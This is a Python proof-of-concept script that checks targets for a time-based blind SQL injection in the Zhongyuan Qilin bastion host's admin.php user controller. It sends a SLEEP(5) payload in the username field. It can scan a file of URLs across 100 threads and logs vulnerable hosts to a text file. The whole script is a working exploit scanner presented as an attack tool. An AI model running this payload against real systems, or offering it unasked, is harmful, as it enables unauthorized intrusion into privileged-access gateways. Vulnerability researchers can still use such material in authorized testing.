# 中远麒麟堡垒机SQL注入
import re,requests,sys,os,argparse,time
import urllib.request
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止他报错

# 指纹模块
def banner():
    banner = """
  ____                _ ____  _ _____  ___  
 / ___|  __ _  __ _  / |___ \/ |___ / ( _ ) 
 \___ \ / _` |/ _` | | | __) | | |_ \ / _ \ 
  ___) | (_| | (_| | | |/ __/| |___) | (_) |
 |____/ \__, |\__, | |_|_____|_|____/ \___/ 
        |___/ |___/                         
                                
                                version:1.0.0
                                For:中远麒麟堡垒机SQL注入
"""
    print(banner)
headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
        "Content-Length": "78",
    }
# poc模块
def poc(target):
    url_payload = '/admin.php?controller=admin_commonuser'
    url = target+url_payload
    data="username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    # data2="username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(1)))ptGN) AND 'AAdm'='AAdm"
    res1 = requests.get(url=target,verify=False)
    if res1.status_code == 200:
        res2 = requests.post(url=url,headers=headers,data=data,verify=False)
        # res3 = requests.post(url=url,headers=header,data=data2,verify=False)
        time1 = res2.elapsed.total_seconds()
        # time2 = res3.elapsed.total_seconds()
        if time1  >= 5:
            print(f'[+]{target}存在延时注入')
            with open('Existence.txt','a') as f:
                f.write(target+'\n')
            return True
        else:
            print(f'[-]{target}不存在延时注入')
            return False
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
        return False

# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a testing tool")
    # -u指定单个url检测， -f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == "__main__":
    main()